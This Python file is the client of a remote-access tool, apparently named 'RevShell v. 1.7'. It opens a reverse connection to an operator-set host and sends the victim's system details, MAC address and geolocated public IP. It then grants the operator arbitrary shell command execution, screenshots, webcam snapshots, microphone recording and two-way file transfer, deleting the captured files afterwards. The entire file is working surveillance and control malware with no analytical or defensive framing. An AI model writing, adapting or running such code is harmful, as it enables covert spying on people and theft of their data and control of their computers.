import socket
import subprocess
import os
import sys
import platform
from urllib.request import urlopen
import json
from uuid import getnode as get_mac
try:
    from PIL import ImageGrab
except ImportError:
    pass
import pyscreenshot as img_grab
import string
import random
import cv2
import time
import sounddevice as sd
from scipy.io.wavfile import write

def id_gen(size=7, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for c in range(size))

host = '127.0.0.1' # CHANGE THIS
port = 1234        # CHANGE THIS
connection = 0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
except ConnectionRefusedError:
    connection = 1
    print("[x] Connection refused")
    
if connection == 0:
    hostname = socket.gethostname()
    username = os.getlogin()
    osys = platform.system()
    osv = platform.release()
    arch = platform.machine()
    url = urlopen('http://ip-api.com/json').read()
    geoip = json.loads(url.decode("utf-8"))
    mac = get_mac()
    a = iter(hex(mac)[2:].zfill(12))
    macj = ":".join(i + next(a) for i in a)
    os.environ['TERM'] = 'xterm'
    delim = '=============================='
    s.send(str.encode('''\033[01;92m\n
 ____             ____  _          _ _
|  _ \ _____   __/ ___|| |__   ___| | |
| |_) / _ \ \ / /\___ \|  _ \ / _ \ | |
|  _ <  __/\ V /  ___) | | | |  __/ | |
|_| \_\___| \_/  |____/|_| |_|\___|_|_|\033[0;0m\n''' + \
                      '\n            v. 1.7 by N3ptun3\n\nSystem information\n' + \
                      '\nOS: ' + osys + ' ' + osv + '\nArch: ' + arch + \
                      '\nCountry code: ' + geoip['countryCode'] + '\nCountry: ' + geoip['country'] + \
                      '\nCity: ' + geoip['city'] + '\nZip code: ' + geoip['zip'] + '\nLatitude: ' + str(geoip ['lat']) + \
                      '\nLongitude: ' + str(geoip['lon']) + '\nPublic IP: ' + geoip['query'] + '\nMac address: ' + macj + \
                      '\n' + delim + '\n\nType help for other commands\n\n[ \033[01;92m' + username + '@' + hostname + ' \033[0;0m] ' + os.getcwd() + '> '))
    while True:
        data = s.recv(2048)
        datad = data.decode("utf-8")
        try:
            if datad[:2].strip() == 'cd':
                os.chdir(datad[3:].strip())
        except FileNotFoundError:
            pass
        except OSError:
            pass
        if datad.strip() == 'help':
            s.send(str.encode('[*] screenshot - To take a screenshot'\
                              '\n[*] webcam_snap - To take a webcam screenshot'\
                              '\n[*] rec_mic - To rec a microphone'\
                              '\n[*] download - To download a file'\
                              '\n[+] upload - To upload a file'\
                              '\n[*] Press ENTER to continue'))
            continue
        if datad.strip() == 'exit':
            s.close()
            sys.exit()
            
        if datad.strip() == " ":
            pass
        
        if datad.strip() == 'screenshot':
            if osys == "Linux":
                img = img_grab.grab()
            else:
                img = ImageGrab.grab()
            filename = 'screen-'+id_gen()+'.png'
            img.save(filename)
            s.send("[*] Sending...".encode())
            f = open(filename, 'rb')
            i = f.read(1024)
            time.sleep(1)
            while i:
                s.send(i)
                i = f.read(1024)
            f.close()
            s.send("complete".encode())
            if osys == 'Windows':
                os.system("del " + filename)          
            else:
                os.system("rm " + filename)
            continue
            
            
        if datad.strip() == 'webcam_snap':
            try:
                cam = cv2.VideoCapture(0)
                retval, frame = cam.read()
                filename = 'webcam-'+id_gen()+'.png'
                cv2.imwrite(filename, frame)
                cv2.waitKey()
                s.send("[*] Sending...".encode())
                f = open(filename, 'rb')
                i = f.read(1024)
                time.sleep(1)
                while (i):
                    s.send(i)
                    i = f.read(1024)
                f.close()
                s.send("complete".encode())
                if osys == 'Windows':
                    os.system("del " + filename)          
                else:
                    os.system("rm " + filename)
                continue

            except:
                s.send(str.encode("[-] Webcam not present\n[*] Press ENTER to continue"))
                continue

        if datad.strip() == "rec_mic":
            try:
                fs = 44100  
                seconds = s.recv(1024)
                secondsd = seconds.decode("utf-8")
                secint = int(secondsd)
                myrecording = sd.rec((secint * fs), samplerate=fs, channels=2)
                sd.wait()
                file = "audio-"+id_gen()+".wav"
                write(file, fs, myrecording)
                s.send("[+] Audio saved".encode())
                f = open(file, 'rb')
                i = f.read(1024)
                time.sleep(1)
                while (i):
                    s.send(i)
                    i = f.read(1024)
                f.close()
                s.send("complete".encode())
                if osys == 'Windows':
                    os.system("del " + file)          
                else:
                    os.system("rm " + file)
                continue
            except:
                s.send(str.encode("[-] Microphone not present\n[*] Press ENTER to continue"))
                continue


        if datad.strip() == "download":
            filename = s.recv(1024)
            if os.path.isfile(filename):
                s.send(str.encode('EXISTS' + str(os.path.getsize(filename))))
                userResp = s.recv(1024)
                userRespd = userResp.decode('utf-8')
                if userRespd[:2] == 'OK':
                    f =  open(filename, 'rb')
                    i = f.read(1024)
                    time.sleep(1)
                    while (i):
                        s.send(i)
                        i = f.read(1024)
                    f.close()
                s.send("[*] Press ENTER to continue".encode())
                continue
            else:
                s.send(str.encode('ERR'))


        if datad.strip() == "upload":
            filename = s.recv(1024)
            d = s.recv(1024)
            dd = d.decode('utf-8')
            if dd[:6] == 'EXISTS':
                filesize = int(d[6:])
                s.send(str.encode('OK'))
                filenamed = filename.decode("utf-8")
                f = open('new-' + filenamed, 'wb')
                d = s.recv(1024)
                totalRecv = len(d)
                f.write(d)
                while totalRecv < filesize:
                    d = s.recv(1024)
                    totalRecv += len(d)
                    f.write(d)
                f.close()
            s.send("[*] Press ENTER to continue".encode())
            continue


        if len(data) > 0:
            sh = subprocess.Popen(datad, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            out = sh.stdout.read()
            if osys == 'Windows':
                outstr = str(out, "windows-1252")
            else:
                outstr = str(out, "utf-8")
            s.send(str.encode(outstr + '[ \033[01;92m' + username + '@' + hostname + ' \033[0;0m] ' + os.getcwd() + '> '))
        else:
            s.close()
            sys.exit()
